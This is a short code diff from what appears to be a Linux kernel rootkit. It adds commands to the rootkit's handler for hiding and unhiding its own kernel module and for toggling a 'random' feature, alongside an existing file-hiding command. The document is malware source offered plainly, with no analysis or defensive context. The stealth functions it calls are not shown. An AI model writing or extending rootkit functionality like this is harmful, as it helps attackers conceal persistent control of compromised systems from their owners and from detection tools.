@@ -31,11 +31,38 @@ void rootkit_handler(struct work_struct* work) {
         case UNHIDE:
             DEBUG_PRINTF("rootkit: unhide command: %s \n", args->string);
             if (!remove_hidden_file(args->string)) {
-                send_response("can't unhid the given file\n", args);
+                send_response("rootkit: can't unhid the given file\n", args);
             } else {
                 send_response("rootkit: successfully unhid the given file\n", args);
             }
             break;
+        case HIDEMOD:
+            DEBUG_PUTS("rootkit: hidemod command \n");
+            if (!hide_module()) {
+                send_response("rootkit: can't hide module\n", args);
+            } else {
+                send_response("rootkit: successfully hid the module\n", args);
+            }
+            break;
+
+        case UNHIDEMOD:
+            DEBUG_PUTS("rootkit: unhidemod command \n");
+            if (!unhide_module()) {
+                send_response("rootkit: can't unhide module\n", args);
+            } else {
+                send_response("rootkit: successfully unhid the module\n", args);
+            }
+            break;
+        
+        case SWITCH_RANDOM:
+            DEBUG_PUTS("rootkit: randswitch command \n");
+            if (switch_random()) {
+                send_response("rootkit: random is off\n", args);
+            } else {
+                send_response("rootkit: random is on\n", args);
+            }
+            break;
+
 
         default:
             DEBUG_PUTS("rootkit: invalid command\n")
